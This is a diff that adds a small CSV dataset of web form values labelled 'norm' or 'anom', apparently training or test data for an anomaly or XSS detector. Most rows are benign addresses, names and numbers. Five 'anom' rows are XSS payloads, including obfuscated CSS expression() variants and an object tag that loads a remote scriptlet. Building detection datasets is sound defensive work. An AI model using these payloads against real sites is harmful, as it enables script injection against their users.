@@ -1,0 +1,23 @@
+payload,label
+c/ caridad s/n,norm
+"campello, el",norm
+40184,norm
+1.44E+15,norm
+nue37,norm
+nuda drudes,norm
+tufts3@joll.rs,norm
+22997112x,norm
+"c/ del ferrocarril, 152,",norm
+arenas de san juan,norm
+19245,norm
+2.07E+15,norm
+fennell,norm
+d50allecido,norm
+1902,norm
+genny,norm
+"<div style=""width: expression(alert('xss'));"">",anom
+"<img style=""xss:expr/*xss*/ession(alert('xss'))"">",anom
+"<xss style=""xss:expression(alert('xss'))"">",anom
+"exp/*<xss style='no\\xss:noxss(""*//*"");",anom
+"<object type=""text/x-scriptlet"" data=""http://ha.ckers.org/scriptlet.html""></object>",anom
+tufts3@joll.rs,norm
